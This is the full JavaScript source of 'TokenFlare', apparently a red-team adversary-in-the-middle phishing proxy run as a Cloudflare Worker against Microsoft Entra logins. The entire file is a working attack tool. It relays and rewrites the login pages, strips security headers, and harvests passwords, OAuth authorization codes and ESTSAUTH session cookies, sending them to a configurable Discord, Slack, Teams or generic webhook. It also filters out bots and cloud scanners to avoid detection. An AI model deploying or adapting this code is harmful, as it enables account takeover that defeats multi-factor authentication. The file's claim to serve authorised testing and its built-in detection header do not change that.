/**
 * TokenFlare - Cloudflare Worker AiTM Proxy
 * For authorized security testing only
 */

/// ─────────────────────────────────────────────────────────────
/// Configuration Defaults
/// ─────────────────────────────────────────────────────────────

// Fallback defaults - typically overridden by wrangler.toml [vars]
const DEFAULTS = {
  upstreamHost: 'login.microsoftonline.com',
  upstreamPath: '/common/oauth2/v2.0/authorize?client_id=4765445b-32c6-49b0-83e6-1d93765276ca&redirect_uri=https%3A%2F%2Fwww.office.com%2Flandingv2&response_type=code%20id_token&scope=openid%20profile%20https%3A%2F%2Fwww.office.com%2Fv2%2FOfficeHome.All&nonce=93572',
  clientTenant: 'common',
  forceHttps: 'true',
  replaceHostRegex: /login\.microsoftonline\.com/gi,
  debug: 'false',
  // Blocking lists - extend via wrangler.toml
  blockedIpPrefixes: ['0.0.0.0', '8.8.8.', '8.8.4.'],
  allowedIps: null,
  blockedUaSubs: ['googlebot', 'bingbot', 'bot'],
  blockedAsOrgs: ['google proxy', 'digital ocean'],
  enableUaCheck: 'true',
  enableAsOrgCheck: 'true',
  enableMozillaCheck: 'true',
  userAgentString: '',
  finalRedirUrl: 'https://www.office.com',
  unauthRedirUrl: 'https://www.office.com',
  lurePath: '/verifyme',
  lureParam: 'uuid',
  lureUuid: ['change-me-in-wrangler-toml']
};


/// ─────────────────────────────────────────────────────────────
/// Request pipeline i.e. main()
/// ─────────────────────────────────────────────────────────────

export default {
  async fetch(request, env) {
    const cfg = loadConfig(env);
    const log = makeLogger(cfg.debug);

    // 1) preFlight blocks & checks
    const denyResp = preflightBlocks(request, cfg, log);
    // all passed => returns null
    if (denyResp) return denyResp;

    // 2) Prepare upstream URL + headers
    const clientUrl = new URL(request.url);
    const upstreamUrl = makeUpstreamUrl(clientUrl, cfg);
    const proxyHeaders = makeProxyHeaders(request.headers, cfg.upstreamHost, `${upstreamUrl.protocol}//${clientUrl.hostname}`, cfg.userAgentString);
    
    // 3) Redirect unauthenticated requests
    if (upstreamUrl === 'unauthenticated') {
      return Response.redirect(cfg.unauthRedirUrl, 302);
    }

    // 4) Opportunistic credential capture (non-blocking)
    if (request.method === 'POST') {
      parseCredentialsFromBody(request).then(async creds => {
        if (creds) await notifyCredentials(cfg.webhookUrl, creds, log).catch(console.error);
      }).catch(() => {});
    }

    // 5) Proxy to upstream
    const upstreamResp = await fetch(upstreamUrl.toString(), {
      method: request.method,
      headers: proxyHeaders,
      body: request.body,                 // safe: we read from a clone above
      redirect: 'manual',
    });

    // WS upgrades pass straight through
    if (isWebSocketUpgrade(proxyHeaders)) return upstreamResp;

    // 6) Build downstream response
    let outHeaders = relaxSecurityHeaders(upstreamResp.headers);

    let locationHeader;
    if (outHeaders.has("Location")){
        // when Entra redirects the user away from login.microsoftonline.com
        locationHeader = decodeURIComponent(outHeaders.get("Location"));

        // when the redirect fits the redir from the intended upstream URI e.g. nativeclient, or office landing
        if (locationHeader.toLowerCase().includes(decodeURIComponent(cfg.redirectUri.toLowerCase()))){
            log.info('Redirect URI in Location header');
            // then try to get the code param from the location header
            if (locationHeader.includes("code=")){
                log.info("Auth code found.");
                let authcodeUri = locationHeader;
		log.info(authcodeUri);
                await notifyAuthCode(cfg.webhookUrl, authcodeUri, log).catch(console.error);
            }
            // then send the user to final redir
            outHeaders.set("Location", cfg.finalRedirUrl);
            log.info("Redirected to final redir");
        }
    }

    // 7) Cookie capture - notify on auth cookies
    const cookiesSet = getSetCookies(outHeaders);
    for (const cookie of cookiesSet) {
      if (cookie.includes('ESTSAUTH=')) {
        for (const secondCookie of cookiesSet) {
          if (secondCookie.includes('ESTSAUTHPERSISTENT=')) {
            await notifyCookies(cfg.webhookUrl, cookie + '\n\n' + secondCookie, log).catch(console.error);
          }
        }
      }
    }

    // 8) Rewrite Set-Cookie domains
    const cookieRewrite = rewriteSetCookieDomains(outHeaders, cfg.replaceHostRegex, clientUrl.hostname);
    if (cookieRewrite) {
      outHeaders = relaxSecurityHeaders(cookieRewrite.headers);
    }

    // 9) Rewrite body hostnames if textual
    const contentType = outHeaders.get('content-type') || '';
    const body = await maybeRewriteBody(upstreamResp, contentType, cfg.replaceHostRegex, clientUrl.hostname);

    return new Response(body, { status: upstreamResp.status, headers: outHeaders });
  },
};

/// ─────────────────────────────────────────────────────────────
/// Guards / builders
/// ─────────────────────────────────────────────────────────────


function preflightBlocks(request, cfg, log) {
  const ip = request.headers.get('cf-connecting-ip') || '';
  const ua = (request.headers.get('user-agent') || '').toLowerCase();
  const asOrg = ((request.cf && request.cf.asOrganization) || '').toLowerCase();
  log.info(`Visited by ip: ${ip}, user-agent: ${ua}, asOrg: ${asOrg}.`);

  // IP prefix check
  if (ip && cfg.blockedIpPrefixes.some((p) => ip.startsWith(p))) {
    log.info('blocked by ip prefix', ip);
    return new Response('Access denied.', { status: 403 });
  }

  // allowed IP check. Only enabled if the allowed IP list is not empty and not null
  if (cfg.allowedIps !== null && cfg.allowedIps.length !== 0) {
    if (!cfg.allowedIps.includes(ip)) {
      log.info('not in allowed IP addresses.');
      return new Response('Access denied.', { status: 403 });
    }
  }

  // UA substrings
  if (cfg.enableUaCheck && ua) {
    for (const sub of cfg.blockedUaSubs) {
      if (ua.includes(sub)) {
        log.info('blocked by UA', sub);
        return new Response('Access denied.', { status: 403 });
      }
    }
  }

  // AS org
  if (cfg.enableAsOrgCheck && asOrg) {
    for (const s of cfg.blockedAsOrgs) {
      if (asOrg.includes(s)) {
        log.info('blocked by AS org', asOrg);
        return new Response('Access denied.', { status: 403 });
      }
    }
  }

  // "real browser" heuristic: require mozilla/5.0 if enabled
  if (cfg.enableMozillaCheck) {
    if (!ua.includes('mozilla/5.0')) {
      log.info('blocked by mozilla check');
      return new Response('Access denied', { status: 403 });
    }
  }
  // need to pass all checks to get a null return
  return null;
}


/** Build upstream URL based on client URL + config. */
/** Also blocks non-lure initial clicks **/
function makeUpstreamUrl(clientUrl, cfg) {
  const u = new URL(clientUrl.toString());
  const idInUrl = u.searchParams.get(cfg.lureParam);
  u.protocol = cfg.forceHttps ? 'https:' : 'http:';
  u.host = cfg.upstreamHost;

  // if visiting / or (/verifyme without valid UUID), redir to unauth place
  if (u.pathname === '/' || (u.pathname === cfg.lurePath && !cfg.lureUuid.includes(idInUrl))) {

    return 'unauthenticated';
  // case where user is legitimately phished, redir to /oauth/v2.0/... to initiate
  } else if(u.pathname === cfg.lurePath && cfg.lureUuid.includes(idInUrl)){
      return new URL(u.protocol + '//' + cfg.upstreamHost + cfg.upstreamPath);
  } else {
  // for non-root we just passthrough as is.
    return u;
  }
}

/** Prepare headers for upstream (Host, Referer etc.). */
function makeProxyHeaders(origHeaders, upstreamHost, refererOrigin, userAgentString) {
  const h = new Headers(origHeaders);
  h.set('Host', upstreamHost);
  h.set('Origin', 'https://' + upstreamHost);
  h.set('Referer', refererOrigin);
  if (userAgentString !== '') {
      h.set('User-Agent', userAgentString);
  }
  // Intentional IoC for blue team detection in Entra ID logs
  h.set('X-TokenFlare', 'Authorised-Security-Testing');
  return h;
}

function isWebSocketUpgrade(headers) {
  return (headers.get('upgrade') || '').toLowerCase() === 'websocket';
}

/// ─────────────────────────────────────────────────────────────
/// Body & header rewriting
/// ─────────────────────────────────────────────────────────────

/** Loosen security headers and add permissive CORS, like original code. */
function relaxSecurityHeaders(inHeaders) {
  const h = new Headers(inHeaders);
  h.set('access-control-allow-origin', '*');
  h.set('access-control-allow-credentials', 'true');
  h.delete('content-security-policy');
  h.delete('content-security-policy-report-only');
  h.delete('clear-site-data');
  return h;
}

/**
 * Rewrites Set-Cookie domain occurrences of the upstream host to the client host.
 * Returns null if nothing to change.
 */
function rewriteSetCookieDomains(inHeaders, replaceHostRegex, clientHost) {
  const setCookies = getSetCookies(inHeaders);
  if (!setCookies.length) return null;

  const h = new Headers(inHeaders);
  h.delete('set-cookie'); // We'll add modified copies

  const modified = setCookies.map(sc => sc.replace(replaceHostRegex, clientHost));
  for (const sc of modified) h.append('set-cookie', sc);

  return { headers: h, cookies: modified };
}

/** Only rewrite response body if it's textual. */
async function maybeRewriteBody(resp, contentType, hostRegex, clientHost) {
  if (!isTextLike(contentType)) {
    return resp.body; // binary/stream: pass through
  }
  try {
    const text = await resp.text();
    return text.replace(hostRegex, clientHost);
  } catch (e) {
    console.error('Body rewrite failed:', e);
    // Fallback: return original as text (best effort)
    return await resp.clone().text().catch(() => resp.body);
  }
}

/** True if safe to treat as text. */
function isTextLike(contentType) {
  const ct = contentType.toLowerCase();
  return (
    ct.includes('text/') ||
    ct.includes('application/javascript') ||
    ct.includes('application/json') ||
    ct.includes('application/xhtml') ||
    ct.includes('application/xml')
  );
}

/** Header variations across runtimes (CF edge vs Miniflare/Undici). */
function getSetCookies(headers) {
  if (typeof headers.getAll === 'function') {
    try { return headers.getAll('set-cookie') || []; } catch {}
  }
  if (typeof headers.getSetCookie === 'function') {
    try { return headers.getSetCookie() || []; } catch {}
  }
  const one = headers.get('set-cookie');
  return one ? [one] : [];
}

/// ─────────────────────────────────────────────────────────────
/// Utils
/// ─────────────────────────────────────────────────────────────

/** Read runtime config from env with safe fallbacks. */
function loadConfig(env) {

    let upstreamPath = env.UPSTREAM_PATH || DEFAULTS.upstreamPath;
    // if someone set a client tenant in wrangler file, we rewrite the first URL they would (i.e. first upstream path)
    let clientTenant;
    if (env.CLIENT_TENANT) {
        clientTenant = env.CLIENT_TENANT;
        upstreamPath = upstreamPath.replace('common', clientTenant);
    } else {
        clientTenant = DEFAULTS.clientTenant;
    }

    let queryParams = new URLSearchParams(upstreamPath);
    let redirURI = queryParams.get("redirect_uri");

  return {
    // proxy settings
    upstreamHost: env.UPSTREAM || DEFAULTS.upstreamHost,
    upstreamPath: upstreamPath,
    replaceHostRegex: env.UPSTREAM_HOSTNAME_REGEX ? new RegExp(env.UPSTREAM_HOSTNAME_REGEX, 'gi') : DEFAULTS.replaceHostRegex,
    forceHttps: parseBool(env.FORCE_HTTPS) || DEFAULTS.forceHttps,
    // blocking & allowlisting
    allowedIps: parseCsv(env.ALLOWED_IPS) ?? DEFAULTS.allowedIps,
    blockedIpPrefixes: parseCsv(env.BLOCKEDIP_PREFIX) || DEFAULTS.blockedIpPrefixes,
    blockedUaSubs:  parseCsv(env.BLOCKEDUA_SUB) || DEFAULTS.blockedUaSubs,
    blockedAsOrgs:  parseCsv(env.BLOCKEDAS_ORG) || DEFAULTS.blockedAsOrgs,
    enableUaCheck: parseBool(env.ENABLE_UA_CHECK) || DEFAULTS.enableUaCheck,
    enableAsOrgCheck: parseBool(env.ENABLE_AS_ORG_CHECK) || DEFAULTS.enableAsOrgCheck,
    enableMozillaCheck: parseBool(env.ENABLE_MOZILLA_CHECK) || DEFAULTS.enableMozillaCheck,
    // client settings
    clientTenant: clientTenant,
    // custom UA to send MS, defaults to proxying the user's UA
    userAgentString: env.CUSTOM_USER_AGENT || DEFAULTS.userAgentString,
    // debugging & notification
    debug: env.DEBUGGING || DEFAULTS.debug,
    // redirect URI, generated from UPSTREAM_PATH
    redirectUri: redirURI,
    webhookUrl: env.WEBHOOK_URL || '',
    // final redirect URL, where the user would be sent to after authentication,
    // n.b. you could sent them to auth again on a different client! :D
    finalRedirUrl: env.FINAL_REDIR || DEFAULTS.finalRedirUrl,
    // where you point users to when they visits webroot, or /<lurePath> without proper UUID
    unauthRedirUrl: env.UNAUTH_REDIR || DEFAULTS.unauthRedirUrl,
    // lure settings
    lurePath: env.LURE_PATH || DEFAULTS.lurePath,
    lureParam: env.LURE_PARAM || DEFAULTS.lureParam,
    lureUuid: parseCsv(env.LURE_UUID) || DEFAULTS.lureUuid,

  };
}

/** "a, b , c" -> ["a","b","c"] */
function parseCsv(str) {
  if (!str) return null;
  return str.split(',').map(s => s.trim()).filter(Boolean);
}

/* return true from 'true', false from 'false', etc*/
function parseBool(v, def = false) {
  if (v == null) return def;
  const s = String(v).trim().toLowerCase();
  return s === '1' || s === 'true' || s === 'yes' || s === 'on';
}

function makeLogger(enabled) {
  return {
    info: (...a) => enabled && console.log('[info]', ...a),
    warn: (...a) => enabled && console.warn('[warn]', ...a),
    error: (...a) => enabled && console.error('[err]', ...a),
  };
}

/// ─────────────────────────────────────────────────────────────
/// Credential & cookie capture
/// ─────────────────────────────────────────────────────────────

/** Best‑effort form credential parsing for POST bodies. */
async function parseCredentialsFromBody(request) {
  if (request.method !== 'POST') return null;

  let body;
  try {
    body = await request.clone().text();
  } catch {
    return null;
  }

  const params = new URLSearchParams(body);
  const login = params.get('login');
  const passwd = params.get('passwd');
  if (!login || !passwd) return null;

  const decode = v => decodeURIComponent(v.replace(/\+/g, ' '));
  return { username: decode(login), password: decode(passwd) };
}


async function notifyAuthCode(webhook, url, log) {
  await notify(webhook, `[TokenFlare] Auth Code Obtained!\n\nCode URL: ${url}`, log);
}

async function notifyCredentials(webhook, { username, password }, log) {
  await notify(webhook, `[TokenFlare] Password Captured!\n\nUser: ${escapeHtml(username)}\nPassword: ${escapeHtml(password)}`, log);
}

async function notifyCookies(webhook, cookies, log) {
  await notify(webhook, `[TokenFlare] Cookies Captured!\n\n${cookies}`, log);
}

/// ─────────────────────────────────────────────────────────────
/// Multi-provider webhook notifications
/// ─────────────────────────────────────────────────────────────

/**
 * Auto-detect webhook provider from URL and send notification
 * Supports: Slack, Discord, Teams, Generic (raw JSON POST)
 */
async function notify(webhook, message, log) {
  if (!webhook) {
    log.warn('No webhook configured');
    return;
  }

  const provider = detectProvider(webhook);
  const payload = formatPayload(message, provider);

  try {
    const response = await fetch(webhook, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload)
    });

    if (!response.ok) {
      log.error(`Webhook failed (${provider}): ${response.status}`);
    } else {
      log.info(`Notification sent via ${provider}`);
    }
  } catch (error) {
    log.error(`Webhook error (${provider}): ${error.message}`);
  }
}

/**
 * Detect webhook provider from URL
 */
function detectProvider(webhook) {
  const url = webhook.toLowerCase();
  if (url.includes('discord.com/api/webhooks') || url.includes('discordapp.com/api/webhooks')) {
    return 'discord';
  } else if (url.includes('hooks.slack.com')) {
    return 'slack';
  } else if (url.includes('webhook.office.com') || url.includes('.webhook.office.com')) {
    return 'teams';
  }
  return 'generic';
}

/**
 * Format payload for specific provider
 */
function formatPayload(message, provider) {
  switch (provider) {
    case 'discord':
      return formatDiscord(message);
    case 'slack':
      return formatSlack(message);
    case 'teams':
      return formatTeams(message);
    default:
      return formatGeneric(message);
  }
}

/**
 * Slack format: { text: "message" }
 */
function formatSlack(message) {
  return { text: message };
}

/**
 * Discord format: { content: "message" } with 2000 char limit
 * Discord also supports embeds for richer formatting
 */
function formatDiscord(message) {
  // Discord has 2000 char limit for content
  const truncated = message.length > 1900
    ? message.substring(0, 1900) + '\n... (truncated)'
    : message;

  return {
    content: truncated,
    username: 'TokenFlare',
    embeds: [{
      title: '🎣 TokenFlare Alert',
      description: truncated,
      color: 0xff6600,  // Orange
      footer: { text: 'TokenFlare - Authorised Testing Only' }
    }]
  };
}

/**
 * Microsoft Teams format: Adaptive Card
 */
function formatTeams(message) {
  return {
    "@type": "MessageCard",
    "@context": "http://schema.org/extensions",
    "themeColor": "ff6600",
    "summary": "TokenFlare Alert",
    "sections": [{
      "activityTitle": "🎣 TokenFlare Alert",
      "text": message.replace(/\n/g, '<br>'),
      "markdown": true
    }]
  };
}

/**
 * Generic format: raw JSON with message field
 */
function formatGeneric(message) {
  return {
    source: 'TokenFlare',
    timestamp: new Date().toISOString(),
    message: message
  };
}

/** Minimal HTML escape for safe rendering. */
function escapeHtml(s) {
  return s.replaceAll('&', '&amp;').replaceAll('<', '&lt;').replaceAll('>', '&gt;');
}


